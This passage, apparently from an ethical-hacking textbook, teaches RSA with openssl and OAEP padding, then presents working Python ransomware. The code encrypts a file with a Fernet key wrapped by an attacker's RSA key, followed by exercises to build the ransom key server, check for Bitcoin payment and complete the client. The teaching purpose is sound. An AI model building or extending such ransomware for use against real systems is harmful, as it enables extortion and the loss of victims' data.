-----BEGIN RSA PRIVATE KEY-----<br/>MIICWwIBAAKBgQC5jGggVL7NzC/ZMfDhbn68yUMfMPczM/Z0uW/R2YU5/KtRxPtK<br/>
9nyWCf3WdUPidWzRlfBh2eJqnhDuY5abTid7rpvkU3vephDzkpeLpqPuM7TAqeOH<br/>
                    ..........<br/>
                    ..........<br/>esvJa46Lzn6bvi3LxQJAF3aKgNy4mDpTGYAud381P9d8qCxHRQMaCZ43MPLnD22q<br/>rf52xkSr0A6I2cJDp4KvF1EvIH8Ca2HlUrKWmCi57g==<br/>
-----END RSA PRIVATE KEY-----</pre>
		<p class="indent"><span epub:type="pagebreak" id="page_80"/>The labels in this output correspond to the theory we discussed earlier in this chapter, and the modulus is the value <em>n</em>. Remember that this is the product of the two prime factors <em>p</em> and <em>q</em>, which are labeled prime1 and prime2 in the output. The public exponent (public key) is the value <em>e</em>, whereas the private exponent (private key) is the value <em>d</em>. The section at the bottom represents the Base64-encoded version of the public–private key pair, with all of its components.</p>
		<p class="indent">You can extract the public key from this file by running the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">openssl rsa -in pub_priv_pair.key  -pubout -out public_key.key</span></pre>
		<p class="indent">The <code>-pubout</code> flag tells <code>openssl</code> to extract the public key from the file. You can view the public key by running the following command, in which the <code>-pubin</code> flag instructs <code>openssl</code> to treat the input as a public key:</p>
		<pre>kali@kali:~$ <span class="codestrong1">openssl rsa  -text -pubin -in public_key.key</span><br/><br/>RSA Public-Key: (1024 bit)<br/>Modulus:<br/>
    00:b9:8c:68:20:54:be:cd:cc:2f:d9:31:f0:e1:6e:<br/>
    7e:bc:c9:43:1f:30:f7:33:33:f6:74:b9:6f:d1:d9:<br/>
    .....<br/>Exponent: 65537 (0x10001)<br/>writing RSA key<br/>
-----BEGIN PUBLIC KEY-----<br/>MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5jGggVL7NzC/ZMfDhbn68yUMf<br/>MPczM/Z0uW/R2YU5/KtRxPtK9nyWCf3WdUPidWzRlfBh2eJqnhDuY5abTid7rpvk<br/>U3vephDzkpeLpqPuM7TAqeOHdtbmLGM5edQNmuO3Iw/VrkISQKfPp00zfcnQ4Db4<br/>sROIQ+sQzQv4Q7Q2bwIDAQAB<br/>
-----END PUBLIC KEY-----</pre>
		<p class="indent">You can make your public key available by publishing it on your website. Notice that the public key also includes the modulus <em>n</em> required for decryption. Because <em>n</em> is the product of the two secret prime numbers (<em>p</em> and <em>q</em>), if a hacker were able to factor <em>n</em>, they could decrypt the RSA cipher text. However, no classical algorithms currently exist that would allow a hacker to efficiently factor <em>n</em> if the prime numbers are large. In 1994, Peter Shor proposed a <em>quantum algorithm</em> that could factor large numbers. The algorithm works, but we haven’t yet been able to create a quantum computer that can run it on large numbers. Until we have a capable quantum computer, RSA remains a safe form of encryption.</p>
		<p class="indent">Time to make use of your new public and private keys. Create a text file to encrypt:</p>
		<pre>kali@kali:~$ <span class="codestrong1">echo "The cat is alive" &gt; plain.txt</span></pre>
		<p class="indent">Use the RSA utility (<code>rsautl</code>), which is part of <code>openssl</code>, to create an encrypted binary file (<em>cipher.bin</em>):</p>
		<pre><span epub:type="pagebreak" id="page_81"/>kali@kali:~$ <span class="codestrong1">openssl rsautl -encrypt -pubin -inkey public_key.key -in plain.</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">txt -out cipher.bin -oaep</span></pre>
		<p class="indent">Notice that we included the <code>-oaep</code> flag. Secure implementations of RSA must also use the OAEP algorithm discussed in the next section. Whenever you’re encrypting and decrypting files using <code>openssl</code>, be sure to apply this flag to make the operations secure.</p>
		<p class="indent">Convert the binary file to Base64 by running the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">openssl base64 -in cipher.bin -out cipher64.txt</span></pre>
		<p class="indent">Converting the file from binary to Base64 encoding allows you to paste it into an email as text. You can view the Base64-encoded text using the <code>cat</code> command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">cat cipher64.txt</span><br/>MAmugbm6FFNEE7+UiFTZ/b8Xn4prqHZPrKYK4IS2E31SHhKWFjjIfzXOB+sFBWBz<br/>ZSoRpeGZ8tSj7vs/pkO/kNCDxRxelfipdOhiigFk6TqAl9JwyB5E76Bm+Ju+sMat<br/>h0Dx6tBjiN4RhT1hRl+9rUxdYk+IziH0jkCCngH6m5g=</pre>
		<p class="indent">Base64 encoding the file doesn’t really encrypt the file; it simply formats it. Always encrypt the file before Base64 encoding it. Decrypt the message by converting the Base64 text back into binary:</p>
		<pre>kali@kali:~$ <span class="codestrong1">openssl base64 -d -in cipher64.txt -out cipher64.bin</span></pre>
		<p class="indent">Then, decrypt the binary using the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">openssl rsautl -decrypt -inkey pub_priv_pair.key -in cipher64.bin</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">-out plainD.txt -oaep</span></pre>
		<p class="indent">Lastly, you can view the decrypted message using the <code>cat</code> command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">cat plainD.txt</span></pre>
		<p class="indent">You should see your original message: The cat is alive.</p>
		<h4 class="h4" id="ch05lev12"><strong><em>Optimal Asymmetric Encryption Padding</em></strong></h4>
		<p class="noindent">Plain RSA isn’t secure because a message will always produce the same cipher text when encrypted with the same public key <em>e</em>. This is because the encryption process (<em>m<sup>e</sup></em> mod <em>n</em>) doesn’t include a random nonce, among other weaknesses. The OAEP preprocessing and postprocessing steps address these issues.</p>
		<p class="indent">Let’s take a look at the OAEP algorithm, leaving some of mathematical details abstract. Before a message is encrypted, it is first run through an OAEP preprocessing step:</p>
		<p class="center"><em>E</em>(<em>e</em>, <em>m</em>, <em>n</em>) = (OAEP-PRE(<em>m</em>))<em><sup>e</sup></em> mod <em>n</em> <span class="ent">≡</span> <em>c</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_82"/>You can represent this step using the following pseudocode:</p>
		<pre>OAEP-pre(m):<br/>
    r = random_nonce()<br/>
 <span class="ent">➊</span> X = pad(m) XOR Hash(r)<br/>
    Y = r XOR Hash(X)<br/>
    return X ∥ Y</pre>
		<p class="indent">The <code>pad()</code> function <span class="ent">➊</span> makes <em>m</em> a larger number by adding zeros to the end of its bit representation, and <code>Hash()</code> represents a hash function, like SHA-256. Why do we need to make <em>m</em> a large number? If <em>m<sup>e</sup></em> is small, the encryption function <em>m<sup>e</sup></em> mod <em>n</em> doesn’t use the modulus, and computing <span class="middle"><img alt="image" src="../images/077equ01.jpg"/></span> is easy. OAEP is a padding algorithm that ensures small numbers are converted into larger ones that use the modulus.</p>
		<p class="indent">The OEAP postprocessing step recovers the original message and can be represented using the following pseudocode:</p>
		<pre>OAEP-post(m'):<br/>
    split m'into X and Y<br/>
    R = Y XOR Hash(X)<br/>
    m_padded = X XOR HASH(R)<br/>
    return remove_padding(m)</pre>
		<p class="indent">Because these encryption processes are so delicate, a hacker could easily break the encryption if they discovered flaws in how a software developer or system administrator used these encryption algorithms. For example, if a programmer used PKCS1 version 1.5 instead of OAEP for preprocessing, a hacker could decrypt the cipher text. So when attempting to break an encrypted message, an attacker should first examine the options used to encrypt the message.</p>
		<p class="indent">Now let us combine these ideas to implement something a lot cooler: ransomware.</p>
		<h3 class="h3" id="ch05lev13"><strong>Writing Ransomware</strong></h3>
		<p class="noindent">The first ransomware systems used symmetric key cryptography and stored the keys in the ransomware itself, which allowed security researchers to extract the keys. Modern ransomware systems use a hybrid approach. They’ll still use a random symmetric key to encrypt files on the victim’s machine, but to prevent security researchers from extracting the key, they’ll encrypt the symmetric key with the hacker’s public key. <a href="ch05.xhtml#ch5fig8">Figure 5-8</a> shows an overview of this process.</p>
		<p class="indent">If the victim pays the ransom, usually by uploading Bitcoin and a copy of the encrypted symmetric key, the ransomware server will use the hacker’s private key to decrypt the symmetric key and return it to the victim. The victim uses this key to decrypt the files.</p>
		<div class="image" id="ch5fig8">
			<span epub:type="pagebreak" id="page_83"/>
			<img alt="image" src="../images/ch05fig08.jpg"/>
		</div>
		<p class="figcap"><em>Figure 5-8: How the ransomware protects the symmetric key by encrypting it using a hacker’s public key</em></p>
		<p class="indent">Of course, the attacker could just accept the payment and ignore the victim, never decrypting the files nor sending the key. Once the victim pays, the attacker has little to gain from participating in the decryption process.</p>
		<p class="indent">In this section, we’ll write our own ransomware client in Python. So that we don’t encrypt all the files on the Kali Linux virtual machine, we’ll limit our ransomware client to encrypting only one file. However, you could easily extend the implementation to encrypt every file on a victim’s computer. First we’ll generate a random symmetric key and then use that key to encrypt the file. After the file has been encrypted, we’ll use our public key to encrypt the symmetric key and save it to a file on the Kali Linux machine. When the program terminates, it will delete the symmetric key.</p>
		<p class="indent">We’ll use the pyca<code>/cryptography</code> library recommended by the Python Cryptography Authority. Install the library by running this command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">pip3 install cryptography</span></pre>
		<p class="indent">After you’ve installed the library, open a text editor such as Mousepad and enter the following:</p>
		<pre>   from cryptography.hazmat.backends import default_backend<br/>
   from cryptography.hazmat.primitives import serialization<br/>
   from cryptography.hazmat.primitives.asymmetric import padding<br/>
   from cryptography.hazmat.primitives import hashes<br/>
   from cryptography.fernet import Fernet<br/><br/><span class="ent">➊</span> symmetricKey  = Fernet.generate_key()<br/><br/>
   FernetInstance = Fernet(symmetricKey)<br/><br/><span class="ent">➋</span> with open("/home/prof/Desktop/Ransomware/public_key.key", "rb") as key_file:<br/>
       public_key = serialization.load_pem_public_key(<br/>
           key_file.read(),<br/>
           backend=default_backend()<br/>
        )<br/><br/><span epub:type="pagebreak" id="page_84"/>   encryptedSymmetricKey = public_key.encrypt(<br/>
       symmetricKey,<br/>
    <span class="ent">➌</span> padding.OAEP(<br/>
           mgf=padding.MGF1(algorithm=hashes.SHA256()),<br/>
        <span class="ent">➍</span> algorithm=hashes.SHA256(),<br/>
           label=None<br/>
       )<br/>
   )<br/><br/><span class="ent">➎</span> with open("encryptedSymmertricKey.key", "wb") as key_file:<br/>
           key_file.write(encryptedSymmetricKey)<br/><br/>
   filePath = "/home/kali/Desktop/Ransomware/FileToEncrypt.txt"<br/><br/>
   with open(filePath, "rb") as file:<br/>
       file_data = file.read()<br/>
    <span class="ent">➏</span> encrypted_data = FernetInstance.encrypt(file_data)<br/><br/>
   with open(filePath, "wb") as file:<br/>
       file.write(encrypted_data)<br/>
   quit()</pre>
		<p class="indent">The <code>Fernet</code> module <span class="ent">➊</span> provides a simple API for performing symmetrickey cryptography. We load the public key from a file by using the <code>with</code> keyword <span class="ent">➋</span>, which is a better alternative to Python’s <code>try finally</code> keywords because it implicitly manages the resource. To see how, consider the following examples. The first example uses the <code>try</code> and <code>finally</code> keywords to open, edit, and close a file:</p>
		<pre>myFile = open('output.txt', 'w')<br/>try:<br/>
    myFile.write('hello world!')<br/>finally:<br/>
    myFile.close()</pre>
		<p class="indent">In contrast, the second example uses the <code>with</code> keyword to implicitly manage the resource, resulting in shorter and more readable code like this:</p>
		<pre>with open('output.txt', 'w') as myFile:<br/>
    myFile.write('hello world!')</pre>
		<p class="indent">We then used the OAEP algorithm <span class="ent">➌</span>. Because OAEP internally relies on a cryptographic hash function, we must select one to use. Here we select the SHA256 hash algorithm <span class="ent">➍</span>.</p>
		<p class="indent">Next, we write the encrypted key to a file in memory <span class="ent">➎</span> and then encrypt the file <span class="ent">➏</span>. When the program terminates, the plaintext symmetric key will be erased from the computer’s memory.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_85"/>Now, how can an attacker in a coffee shop demand money from a company by uploading this encryption ransomware to the company’s systems? In <a href="ch02.xhtml#ch2">Chapter 2</a>, we discussed how an attacker could use an ARP spoofing attack to intercept a target’s web traffic. In <a href="ch03.xhtml#ch3">Chapter 3</a>, you learned how the attacker used Wireshark to extract the IP address of a server the target was visiting, and in <a href="ch04.xhtml#ch4">Chapter 4</a>, we looked at how the attacker used <code>nmap</code> to scan the server and discover a vulnerable FTP application running on port 21. We also saw how an attacker could exploit the FTP application and upload a custom reverse shell. The attacker could then use this reverse shell to upload a copy of their own encryption ransomware to the web server. In <a href="ch07.xhtml#ch7">Chapters 7</a> and <a href="ch08.xhtml#ch8">8</a>, we’ll discuss techniques that hackers could use if they can’t find other vulnerabilities in the server.</p>
		<h3 class="h3" id="ch05lev14"><strong>Exercises</strong></h3>
		<p class="noindent">Attempt the following exercises to deepen your understanding of encryption and ransomware. In the first exercise, you’ll write a ransomware server that decrypts the symmetric key and returns it to the client. In the second exercise, you’ll extend the client so that it sends a copy of the encrypted key to the server. In the final exercise, you’ll explore the solved and unsolved codes written on the Kryptos statue in front of Central Intelligence Agency (CIA) headquarters in Langley, Virginia.</p>
		<h4 class="h4" id="ch05lev15"><strong><em>The Ransomware Server</em></strong></h4>
		<p class="noindent">Implement a server that communicates with your ransomware client. Your server should be able to handle multiple client connections. Once a client connects to the server, the client will send the server an encrypted symmetric key. Your server should decrypt this key using its private key and then send it to the client:</p>
		<pre>import socketserver<br/><br/>class ClientHandler(socketserver.BaseRequestHandler):<br/><br/>
  <span class="ent">➊</span> def handle(self):<br/>
        encrypted_key = self.request.recv(1024).strip()<br/>
        print ("Implement decryption of data " + encrypted_key )<br/>
        #------------------------------------<br/>
        #      Decryption Code Here<br/>
        #------------------------------------<br/>
        self.request.sendall("send key back")<br/>if __name__ == "__main__":<br/>
    HOST, PORT = "", 8000<br/><br/>
  <span class="ent">➋</span> tcpServer =  socketserver.TCPServer((HOST, PORT), ClientHandler)<br/>
     try:<br/>
      <span class="ent">➌</span> tcpServer.serve_forever()<br/>
    <span epub:type="pagebreak" id="page_86"/>except:<br/>
        print("There was an error")</pre>
		<p class="indent">We began implementing the function that will decrypt the symmetric key and send it back to the client <span class="ent">➊</span>. As an exercise, try modifying the function so that it decrypts the key and sends it back. Hint: read the RSA decryption section of the pyca/<code>cryptography</code> library documentation at <em><a href="https://cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa.html">https://cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa.html</a></em>. Remember that you need to load the private key before you use it.</p>
		<p class="indent">Next, we create a new instance of the TCP server <span class="ent">➋</span>, and then we start the server <span class="ent">➌</span>. This is the same TCP server code you used in <a href="ch04.xhtml#ch4">Chapter 4</a>.</p>
		<p class="indent">As an added challenge, try extending the ransomware server to check for the receipt of a Bitcoin payment before sending the decrypted key.</p>
		<h4 class="h4" id="ch05lev16"><strong><em>Extending the Ransomware Client</em></strong></h4>
		<p class="noindent">Extend the ransomware client you built in this chapter to include the ability to decrypt the file after it receives the decrypted symmetric key from the ransomware server you built in the previous exercise. This client will need to send the ransomware server a copy of the encrypted symmetric key and read the decrypted symmetric key that the server sends back. It will then need to use the decrypted symmetric key to decrypt the file it encrypted earlier.</p>
		<pre>   import socket<br/>
                    ...<br/>
   def sendEncryptedKey(eKeyFilePath):<br/>
    <span class="ent">➊</span> with socket.create_connection((hostname, port)) as sock:<br/>
          with open(eKeyFilePath, "rb") as file:<br/>
           <span class="ent">➋</span> pass<br/><br/><span class="ent">➌</span> def decryptFile(filePath, key):<br/>
       pass</pre>
		<p class="noindent">We create a new socket and open the key file <span class="ent">➊</span>. Then, you need to implement the code that sends the key file and waits for the decrypted result <span class="ent">➋</span>. When you receive the decrypted key, pass it to the <code>decryptFile()</code> function <span class="ent">➌</span>.</p>
		<p class="indent">Notice that this function contains no code: I’ll leave it to you to implement the decryption function so that it uses the <code>Fernet</code> module to restore the file. Hint: read <em><a href="https://cryptography.io/en/latest/">https://cryptography.io/en/latest/</a></em> for tips on how to do this.</p>
		<h4 class="h4" id="ch05lev17"><strong><em>Unsolved Codes</em></strong></h4>
		<p class="noindent">Several codes remain unsolved, including the famous ones written on the Kryptos statue in front of CIA headquarters. The statue contains four encrypted messages, three of which have been solved. The first two codes were encrypted using an extension of the Caesar cipher called the <em>Vigenère cipher</em>. The third was encrypted using a technique called <em>transposition</em>.</p>
		<p class="indent"><span epub:type="pagebreak" id="page_87"/>However, no one has been able to decrypt the fourth code. The artist who created the statue, Jim Sanborn, has provided four hints, shown in <a href="ch05.xhtml#ch5tab2">Table 5-2</a>. Try solving the first three codes yourself. The first code was encrypted using a Vigenère cipher and the key: Kryptos, Palimpsest. If you use this key and a Vigenère table, you will be able decode it. Then, if you feel brave enough, try decoding the fourth, unsolved code.</p>
		<p class="tabcap" id="ch5tab2"><strong>Table 5-2:</strong> Four Hints from Jim Sanborn</p>
		<table class="bordertb">
			<colgroup>
				<col style="width:35%"/>
				<col style="width:40%"/>
				<col style="width:35%"/>
			</colgroup>
			<thead>
				<tr>
					<th class="borderb" style="vertical-align: top;">
						<p class="tab">Position</p>
					</th>
					<th class="borderb" style="vertical-align: top;">
						<p class="tab">Cipher text</p>
					</th>
					<th class="borderb" style="vertical-align: top;">
						<p class="tab">Plaintext</p>
					</th>
				</tr>
			</thead>
			<tbody>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab">64th–69th letters</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">“NYPVTT”</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">“BERLIN</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab">70th–74th</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">“MZFPK”</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">“CLOCK”</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab">26th–34th</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">“EFGHIJL0H”</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">“NORTHEAST”</p>
					</td>
				</tr>
				<tr>
					<td style="vertical-align: top;">
						<p class="tab">22nd–25th</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">“FLRV”</p>
					</td>
					<td style="vertical-align: top;">
						<p class="tab">“EAST”</p>
					</td>
				</tr>
			</tbody>
		</table>
		<p class="indent">Following is a representation of the four encrypted messages:</p>
		<pre>EMUFPHZLRFAXYUSDJKZLDKRNSHGNFIVJ    ABCDEFGHIJKLMNOPQRSTUVWXYZABCD<br/>YQTQUXQBQVYUVLLTREVJYQTMKYRDMFD     AKRYPTOSABCDEFGHIJLMNQUVWXZKRYP<br/>VFPJUDEEHZWETZYVGWHKKQETGFQJNCE     BRYPTOSABCDEFGHIJLMNQUVWXZKRYPT<br/>GGWHKK?DQMCPFQZDQMMIAGPFXHQRLG      CYPTOSABCDEFGHIJLMNQUVWXZKRYPTO<br/>TIMVMZJANQLVKQEDAGDVFRPJUNGEUNA     DPTOSABCDEFGHIJLMNQUVWXZKRYPTOS<br/>QZGZLECGYUXUEENJTBJLBQCRTBJDFHRR    ETOSABCDEFGHIJLMNQUVWXZKRYPTOSA<br/>YIZETKZEMVDUFKSJHKFWHKUWQLSZFTI     FOSABCDEFGHIJLMNQUVWXZKRYPTOSAB<br/>HHDDDUVH?DWKBFUFPWNTDFIYCUQZERE     GSABCDEFGHIJLMNQUVWXZKRYPTOSABC<br/>EVLDKFEZMOQQJLTTUGSYQPFEUNLAVIDX    HABCDEFGHIJLMNQUVWXZKRYPTOSABCD<br/>FLGGTEZ?FKZBSFDQVGOGIPUFXHHDRKF     IBCDEFGHIJLMNQUVWXZKRYPTOSABCDE<br/>FHQNTGPUAECNUVPDJMQCLQUMUNEDFQ      JCDEFGHIJLMNQUVWXZKRYPTOSABCDEF<br/>ELZZVRRGKFFVOEEXBDMVPNFQXEZLGRE     KDEFGHIJLMNQUVWXZKRYPTOSABCDEFG<br/>DNQFMPNZGLFLPMRJQYALMGNUVPDXVKP     LEFGHIJLMNQUVWXZKRYPTOSABCDEFGH<br/>DQUMEBEDMHDAFMJGZNUPLGEWJLLAETG     MFGHIJLMNQUVWXZKRYPTOSABCDEFGHI<br/><br/>ENDYAHROHNLSRHEOCPTEOIBIDYSHNAIA    NGHIJLMNQUVWXZKRYPTOSABCDEFGHIJL<br/>CHTNREYULDSLLSLLNOHSNOSMRWXMNE      OHIJLMNQUVWXZKRYPTOSABCDEFGHIJL<br/>TPRNGATIHNRARPESLNNELEBLPIIACAE     PIJLMNQUVWXZKRYPTOSABCDEFGHIJLM<br/>WMTWNDITEENRAHCTENEUDRETNHAEOE      QJLMNQUVWXZKRYPTOSABCDEFGHIJLMN<br/>TFOLSEDTIWENHAEIOYTEYQHEENCTAYCR    RLMNQUVWXZKRYPTOSABCDEFGHIJLMNQ<br/>EIFTBRSPAMHHEWENATAMATEGYEERLB      SMNQUVWXZKRYPTOSABCDEFGHIJLMNQU<br/>TEEFOASFIOTUETUAEOTOARMAEERTNRTI    TNQUVWXZKRYPTOSABCDEFGHIJLMNQUV<br/>BSEDDNIAAHTTMSTEWPIEROAGRIEWFEB     UQUVWXZKRYPTOSABCDEFGHIJLMNQUVW<br/>AECTDDHILCEIHSITEGOEAOSDDRYDLORIT   VUVWXZKRYPTOSABCDEFGHIJLMNQUVWX<br/>RKLMLEHAGTDHARDPNEOHMGFMFEUHE       WVWXZKRYPTOSABCDEFGHIJLMNQUVWXZ<br/>ECDMRIPFEIMEHNLSSTTRTVDOHW?OBKR     XWXZKRYPTOSABCDEFGHIJLMNQUVWXZK<br/>UOXOGHULBSOLIFBBWFLRVQQPRNGKSSO     YXZKRYPTOSABCDEFGHIJLMNQUVWXZKR<br/>TWTQSJQSSEKZZWATJKLUDIAWINFBNYP     ZZKRYPTOSABCDEFGHIJLMNQUVWXZKRY<br/>VTTMZFPKWGDKZXTJCDIGKUHUAUEKCAR      ABCDEFGHIJKLMNOPQRSTUVWXYZABCD<span epub:type="pagebreak" id="page_88"/></pre>
	</body>
</html>